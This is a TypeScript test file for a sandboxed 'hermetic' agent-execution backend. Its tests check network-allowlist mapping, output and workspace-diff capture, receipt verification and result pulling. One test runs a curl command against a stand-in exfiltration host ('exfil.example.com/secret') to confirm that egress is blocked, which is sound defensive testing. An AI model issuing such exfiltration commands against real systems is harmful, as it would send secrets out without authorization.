import assert from "node:assert/strict";
import { readFileSync, rmSync } from "node:fs";
import { join } from "node:path";
import { after, before, test } from "node:test";

import { verifyReceiptBundle } from "@fusionkit/protocol";
import { git, makeRepo, startStack } from "@fusionkit/testkit";
import type { Stack } from "@fusionkit/testkit";
import { captureWorkspace } from "@fusionkit/workspace";

import { hermeticBackend, toJustBashNetwork } from "../index.js";

const POOL = "eng-prod";

let stack: Stack;
let repoDir: string;

before(async () => {
  stack = await startStack({
    pool: POOL,
    // Every run in this file is claimed manually via stack.runOnce(); a
    // background polling runner would race it for the claim and make
    // runOnce() return undefined (flaky under CI load).
    startRunner: false,
    backends: [hermeticBackend()],
    policy: (policy) => {
      policy.agents.allow = ["command"];
      policy.network.allowHosts = ["example.com"];
    }
  });
  repoDir = makeRepo({
    files: { "README.md": "# hermetic fixture\n", "data.txt": "one\ntwo\nthree\n" }
  });
});

after(async () => {
  await stack.stop();
  rmSync(repoDir, { recursive: true, force: true });
});

async function runHermetic(prompt: string, allowHosts: string[] = []) {
  const captured = captureWorkspace(repoDir);
  await stack.client.putBlob(captured.bundle);
  if (captured.dirtyDiff) await stack.client.putBlob(captured.dirtyDiff);
  const created = await stack.client.requestRun({
    requestedBy: { kind: "human", id: "hermetic-tester" },
    agentKind: "command",
    prompt,
    pool: POOL,
    secretNames: [],
    workspace: captured.manifest,
    network: { defaultDeny: true, allowHosts },
    budget: {},
    disclosure: "minimal-context",
    isolation: "hermetic"
  });
  assert.equal(await stack.runOnce(), created.runId);
  return stack.client.getBundle(created.runId);
}

test("network policy maps to just-bash allowlists", () => {
  assert.deepEqual(toJustBashNetwork({ defaultDeny: false, allowHosts: [] }), {
    dangerouslyAllowFullInternetAccess: true
  });
  assert.equal(toJustBashNetwork({ defaultDeny: true, allowHosts: [] }), undefined);
  assert.deepEqual(
    toJustBashNetwork({ defaultDeny: true, allowHosts: ["api.example.com"] }),
    { allowedUrlPrefixes: ["https://api.example.com", "http://api.example.com"] }
  );
});

test("hermetic session runs the command, captures output, records the tier", async () => {
  const bundle = await runHermetic(
    "wc -l < data.txt > count.txt && cat count.txt && echo hermetic-ok"
  );
  assert.equal(bundle.receipt.status, "completed");
  assert.equal(bundle.receipt.runner.isolation, "hermetic");

  // The workspace write happened inside the interpreter and came back.
  assert.ok(bundle.receipt.workspaceOut.diffHash, "expected a workspace diff");
  const diff = await stack.client.getBlob(bundle.receipt.workspaceOut.diffHash);
  assert.ok(diff.toString("utf8").includes("count.txt"));

  // The session log is captured as an artifact.
  const logEvent = bundle.events.find(
    (e) => e.event.type === "artifact.created" && e.event.kind === "log"
  );
  assert.ok(logEvent && logEvent.event.type === "artifact.created");
  const log = await stack.client.getBlob(logEvent.event.hash);
  assert.ok(log.toString("utf8").includes("hermetic-ok"));

  // Offline verification holds for hermetic receipts too.
  assert.deepEqual(verifyReceiptBundle(bundle).problems, []);
});

test("egress is interpreter-enforced: a denied host cannot be reached", async () => {
  // No host allowlisted on this run: curl should not exist at all.
  const bundle = await runHermetic(
    "curl -s https://exfil.example.com/secret || echo BLOCKED-no-curl"
  );
  const logEvent = bundle.events.find(
    (e) => e.event.type === "artifact.created" && e.event.kind === "log"
  );
  assert.ok(logEvent && logEvent.event.type === "artifact.created");
  const log = (await stack.client.getBlob(logEvent.event.hash)).toString("utf8");
  assert.ok(
    log.includes("BLOCKED-no-curl") || log.toLowerCase().includes("not found"),
    `expected egress to be blocked, got: ${log}`
  );
});

test("the pull brings hermetic results back into the workspace", async () => {
  const bundle = await runHermetic("echo 'from the hermetic session' > note.md");
  const diffHash = bundle.receipt.workspaceOut.diffHash;
  assert.ok(diffHash);
  const diff = await stack.client.getBlob(diffHash);
  const { pullRun } = await import("@fusionkit/workspace");
  git(repoDir, ["stash", "--include-untracked"]);
  const result = pullRun(repoDir, bundle.receipt.runId, bundle.contract.workspace.baseRef, diff);
  assert.equal(result.mode, "applied");
  assert.equal(
    readFileSync(join(repoDir, "note.md"), "utf8").trim(),
    "from the hermetic session"
  );
});
